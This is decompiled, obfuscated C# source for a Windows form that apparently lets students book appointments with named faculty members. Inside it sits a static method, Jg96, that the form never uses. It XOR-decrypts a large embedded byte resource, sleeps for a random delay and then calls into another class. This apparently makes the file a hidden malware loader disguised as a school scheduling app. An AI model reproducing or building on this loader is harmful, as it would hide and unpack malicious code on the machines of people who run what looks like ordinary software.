using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Km2;
using Microsoft.VisualBasic.CompilerServices;
using g7N;
using x6P;

namespace b3NB;

[DesignerGenerated]
public class Kj05 : Form
{
	private Label _Label5;

	private ComboBox _Appointment;

	private ComboBox _Schedule;

	private ComboBox _FacultyName;

	private TextBox _StudentEmail;

	private Label _Label6;

	internal IContainer E;

	internal Panel w;

	internal Button T;

	internal Label K;

	internal Label S;

	internal Label U;

	internal Label O;

	internal TextBox B;

	internal TextBox y;

	internal NotifyIcon X;

	public Kj05()
	{
		n7T3();
	}

	protected override void Hy36(bool w6F2)
	{
		try
		{
			if (w6F2 && E != null)
			{
				E.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(w6F2);
		}
	}

	private void n7T3()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_0750: Unknown result type (might be due to invalid IL or missing references)
		//IL_075a: Expected O, but got Unknown
		IContainer container = (E = new Container());
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Kj05));
		Ds5z(new Panel());
		Qf4o(new Button());
		m4P5(new Label());
		q3Y7(new Label());
		t9QE(new Label());
		Mx6t(new Label());
		f4G1(new Label());
		Pr4o(new Label());
		Yd40(new ComboBox());
		y5AZ(new ComboBox());
		Gp75(new ComboBox());
		Rk5x(new TextBox());
		En96(new TextBox());
		s3RJ(new TextBox());
		Xj48(new NotifyIcon(E));
		((Control)Jd7y()).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)Jd7y()).get_Controls().Add((Control)(object)Gm06());
		((Control)Jd7y()).get_Controls().Add((Control)(object)Et4k());
		((Control)Jd7y()).get_Controls().Add((Control)(object)Jd74());
		((Control)Jd7y()).get_Controls().Add((Control)(object)c2L0());
		((Control)Jd7y()).get_Controls().Add((Control)(object)Xp76());
		((Control)Jd7y()).get_Controls().Add((Control)(object)g8X7());
		((Control)Jd7y()).get_Controls().Add((Control)(object)a6R2());
		((Control)Jd7y()).get_Controls().Add((Control)(object)z8E2());
		((Control)Jd7y()).get_Controls().Add((Control)(object)f4DS());
		((Control)Jd7y()).get_Controls().Add((Control)(object)j5M9());
		((Control)Jd7y()).get_Controls().Add((Control)(object)Ce30());
		((Control)Jd7y()).get_Controls().Add((Control)(object)Gi6a());
		((Control)Jd7y()).get_Controls().Add((Control)(object)i1SD());
		((Control)Jd7y()).set_Location(new Point(37, 18));
		((Control)Jd7y()).set_Name("Panel1");
		((Control)Jd7y()).set_Size(new Size(357, 317));
		((Control)Jd7y()).set_TabIndex(0);
		((Control)Gm06()).set_Location(new Point(153, 244));
		((Control)Gm06()).set_Name("Button1");
		((Control)Gm06()).set_Size(new Size(166, 25));
		((Control)Gm06()).set_TabIndex(14);
		((ButtonBase)Gm06()).set_Text("Set Appointment");
		((ButtonBase)Gm06()).set_UseVisualStyleBackColor(true);
		Et4k().set_AutoSize(true);
		((Control)Et4k()).set_Location(new Point(47, 215));
		((Control)Et4k()).set_Name("Label5");
		((Control)Et4k()).set_Size(new Size(66, 13));
		((Control)Et4k()).set_TabIndex(9);
		Et4k().set_Text("Appointment");
		Jd74().set_AutoSize(true);
		((Control)Jd74()).set_Location(new Point(47, 174));
		((Control)Jd74()).set_Name("Label4");
		((Control)Jd74()).set_Size(new Size(52, 13));
		((Control)Jd74()).set_TabIndex(10);
		Jd74().set_Text("Schedule");
		c2L0().set_AutoSize(true);
		((Control)c2L0()).set_Location(new Point(47, 100));
		((Control)c2L0()).set_Name("Label6");
		((Control)c2L0()).set_Size(new Size(55, 13));
		((Control)c2L0()).set_TabIndex(11);
		c2L0().set_Text("Faculty ID");
		Xp76().set_AutoSize(true);
		((Control)Xp76()).set_Location(new Point(47, 135));
		((Control)Xp76()).set_Name("Label3");
		((Control)Xp76()).set_Size(new Size(69, 13));
		((Control)Xp76()).set_TabIndex(11);
		Xp76().set_Text("Faculty Email");
		g8X7().set_AutoSize(true);
		((Control)g8X7()).set_Location(new Point(47, 64));
		((Control)g8X7()).set_Name("Label2");
		((Control)g8X7()).set_Size(new Size(41, 13));
		((Control)g8X7()).set_TabIndex(12);
		g8X7().set_Text("Faculty");
		a6R2().set_AutoSize(true);
		((Control)a6R2()).set_Location(new Point(47, 29));
		((Control)a6R2()).set_Name("Label1");
		((Control)a6R2()).set_Size(new Size(32, 13));
		((Control)a6R2()).set_TabIndex(13);
		a6R2().set_Text("Email");
		((ListControl)z8E2()).set_FormattingEnabled(true);
		z8E2().get_Items().AddRange(new object[1] { "Grade Consultation" });
		((Control)z8E2()).set_Location(new Point(153, 207));
		((Control)z8E2()).set_Name("Appointment");
		((Control)z8E2()).set_Size(new Size(166, 21));
		((Control)z8E2()).set_TabIndex(6);
		((ListControl)f4DS()).set_FormattingEnabled(true);
		((Control)f4DS()).set_Location(new Point(153, 166));
		((Control)f4DS()).set_Name("Schedule");
		((Control)f4DS()).set_Size(new Size(166, 21));
		((Control)f4DS()).set_TabIndex(7);
		((ListControl)j5M9()).set_FormattingEnabled(true);
		j5M9().get_Items().AddRange(new object[3] { "Patrick Mack", "Patrick Marlowe", "Maria Ramila Jimenez" });
		((Control)j5M9()).set_Location(new Point(153, 56));
		((Control)j5M9()).set_Name("FacultyName");
		((Control)j5M9()).set_Size(new Size(166, 21));
		((Control)j5M9()).set_TabIndex(8);
		((Control)Ce30()).set_Location(new Point(153, 93));
		((Control)Ce30()).set_Name("TextBox1");
		((Control)Ce30()).set_Size(new Size(164, 20));
		((Control)Ce30()).set_TabIndex(4);
		((Control)Gi6a()).set_Location(new Point(153, 128));
		((Control)Gi6a()).set_Name("FacultyEmail");
		((Control)Gi6a()).set_Size(new Size(164, 20));
		((Control)Gi6a()).set_TabIndex(4);
		((Control)i1SD()).set_Location(new Point(153, 22));
		((Control)i1SD()).set_Name("StudentEmail");
		((Control)i1SD()).set_Size(new Size(164, 20));
		((Control)i1SD()).set_TabIndex(5);
		r2JF().set_BalloonTipTitle("Click Me!");
		r2JF().set_Icon((Icon)componentResourceManager.GetObject("NotifyIcon1.Icon"));
		r2JF().set_Text("NotifyIcon1");
		r2JF().set_Visible(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(441, 347));
		((Control)this).get_Controls().Add((Control)(object)Jd7y());
		((Control)this).set_Name("SetSchedule");
		((Form)this).set_Text("SetSchedule");
		((Control)Jd7y()).ResumeLayout(false);
		((Control)Jd7y()).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual Panel Jd7y()
	{
		return w;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ds5z(Panel w2JT)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		PaintEventHandler val = new PaintEventHandler(i9R8);
		Panel val2 = w;
		if (val2 != null)
		{
			((Control)val2).remove_Paint(val);
		}
		Panel val3 = (w = w2JT);
		val2 = w;
		if (val2 != null)
		{
			((Control)val2).add_Paint(val);
		}
	}

	[SpecialName]
	internal virtual Button Gm06()
	{
		return T;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qf4o(Button q8PT)
	{
		EventHandler eventHandler = s6LW;
		Button t = T;
		if (t != null)
		{
			((Control)t).remove_Click(eventHandler);
		}
		Button val = (T = q8PT);
		t = T;
		if (t != null)
		{
			((Control)t).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Et4k()
	{
		return _Label5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void m4P5(Label p7H1)
	{
		_Label5 = p7H1;
	}

	[SpecialName]
	internal virtual Label Jd74()
	{
		return K;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q3Y7(Label y9W6)
	{
		Label val = (K = y9W6);
	}

	[SpecialName]
	internal virtual Label Xp76()
	{
		return S;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Mx6t(Label a8W7)
	{
		Label val = (S = a8W7);
	}

	[SpecialName]
	internal virtual Label g8X7()
	{
		return U;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f4G1(Label p3S4)
	{
		Label val = (U = p3S4);
	}

	[SpecialName]
	internal virtual Label a6R2()
	{
		return O;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pr4o(Label r1T6)
	{
		Label val = (O = r1T6);
	}

	[SpecialName]
	internal virtual ComboBox z8E2()
	{
		return _Appointment;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yd40(ComboBox Lo92)
	{
		_Appointment = Lo92;
	}

	[SpecialName]
	internal virtual ComboBox f4DS()
	{
		return _Schedule;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y5AZ(ComboBox c5H3)
	{
		_Schedule = c5H3;
	}

	[SpecialName]
	internal virtual ComboBox j5M9()
	{
		return _FacultyName;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gp75(ComboBox c2A3)
	{
		EventHandler eventHandler = Cn89;
		ComboBox facultyName = _FacultyName;
		if (facultyName != null)
		{
			facultyName.remove_SelectedIndexChanged(eventHandler);
		}
		_FacultyName = c2A3;
		facultyName = _FacultyName;
		if (facultyName != null)
		{
			facultyName.add_SelectedIndexChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox Gi6a()
	{
		return B;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void En96(TextBox m1L6)
	{
		TextBox val = (B = m1L6);
	}

	[SpecialName]
	internal virtual TextBox i1SD()
	{
		return _StudentEmail;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void s3RJ(TextBox z3A8)
	{
		_StudentEmail = z3A8;
	}

	[SpecialName]
	internal virtual Label c2L0()
	{
		return _Label6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t9QE(Label Ca21)
	{
		_Label6 = Ca21;
	}

	[SpecialName]
	internal virtual TextBox Ce30()
	{
		return y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Rk5x(TextBox Mt70)
	{
		TextBox val = (y = Mt70);
	}

	[SpecialName]
	internal virtual NotifyIcon r2JF()
	{
		return X;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xj48(NotifyIcon r4Z8)
	{
		NotifyIcon val = (X = r4Z8);
	}

	private void s6LW(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(i1SD().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please enter email address.");
		}
		if (Operators.CompareString(j5M9().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please choose faculty member.");
		}
		if (Operators.CompareString(f4DS().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please choose schedule of appointment.");
		}
		if (Operators.CompareString(z8E2().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please choose reason of appointment.");
		}
		Rt9.Forms.An4().Xy1().Wa7(i1SD().get_Text(), j5M9().get_Text(), f4DS().get_Text(), z8E2().get_Text(), "PENDING");
		Rt9.Forms.An4().Xy1().Zq5(Rt9.Forms.An4().k5Z().History);
		Rt9.Forms.d9Y().Wq39().Xe07(Rt9.Forms.Yj7().w6F1().get_Text(), Rt9.Forms.Yj7().z8FE().get_Text(), i1SD().get_Text(), f4DS().get_Text(), z8E2().get_Text(), Ce30().get_Text());
		Rt9.Forms.d9Y().Wq39().a0G7(Rt9.Forms.d9Y().Qp81().Pending);
		if (Operators.CompareString(j5M9().get_Text(), "Patrick Mack", false) == 0)
		{
			Rt9.Forms.Qb8().x4J().ShowBalloonTip(500, "Click Me!", "You have an appointment request from" + Rt9.Forms.Yj7().z8FE().get_Text(), (ToolTipIcon)1);
		}
	}

	internal static void Jg96()
	{
		byte[] array = Rf6.Sk1(133632);
		checked
		{
			int d5ST = Conversions.ToInteger(Rf6.mDic[Rf6.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Kw28(array[i], (byte[])Rf6.mDic[Rf6.sArray], d5ST, i);
			}
			Rf6.mDic.Add(Rf6.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			Jz8.Cf7i();
		}
	}

	private void Cn89(object sender, EventArgs e)
	{
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(j5M9().get_SelectedItem(), (object)"Patrick Mack", false))
		{
			f4DS().get_Items().Add((object)"Mon 8:30am-12pm");
			f4DS().get_Items().Add((object)"Mon 4:30am-6pm");
			f4DS().get_Items().Add((object)"Tue 1:30pm-3:30pm");
			f4DS().get_Items().Add((object)"Wed 8:30-11:30am");
			f4DS().get_Items().Add((object)"Thu 8:30am-12pm");
			f4DS().set_SelectedIndex(0);
		}
		else if (Operators.ConditionalCompareObjectEqual(j5M9().get_SelectedItem(), (object)"Patrick Oliva", false))
		{
			f4DS().get_Items().Add((object)"Mon 1:30am-3pm");
			f4DS().get_Items().Add((object)"Tue 8:30pm-12pm");
			f4DS().get_Items().Add((object)"Wed 8:30-11:30am");
			f4DS().get_Items().Add((object)"Fri 8:30am-12pm");
			f4DS().set_SelectedIndex(0);
		}
		if (Operators.ConditionalCompareObjectEqual(j5M9().get_SelectedItem(), (object)"Patrick Mack", false))
		{
			Gi6a().set_Text("patrickmack@gmail.com");
		}
		else if (Operators.ConditionalCompareObjectEqual(j5M9().get_SelectedItem(), (object)"Patrick Oliva", false))
		{
			Gi6a().set_Text("patrickoliva@gmail.com");
		}
		else if (Operators.ConditionalCompareObjectEqual(j5M9().get_SelectedItem(), (object)"Maria Ramila Jimenez", false))
		{
			Gi6a().set_Text("mjimenez@gmail.com");
		}
		if (Operators.ConditionalCompareObjectEqual(j5M9().get_SelectedItem(), (object)"Patrick Mack", false))
		{
			Ce30().set_Text("2020");
		}
		else if (Operators.ConditionalCompareObjectEqual(j5M9().get_SelectedItem(), (object)"Maria Ramila Jimenez", false))
		{
			Ce30().set_Text("2021");
		}
		else
		{
			MessageBox.Show("GO!");
		}
	}

	internal static byte Kw28(byte Fs0a, byte[] Kk5q, int d5ST, int z0K2)
	{
		Fs0a = (byte)(Fs0a ^ checked((byte)(Kk5q[unchecked(z0K2 % Kk5q.Length)] ^ ((z0K2 + unchecked(d5ST % Kk5q.Length)) & d5ST))));
		return Fs0a;
	}

	private void i9R8(object sender, PaintEventArgs e)
	{
	}
}
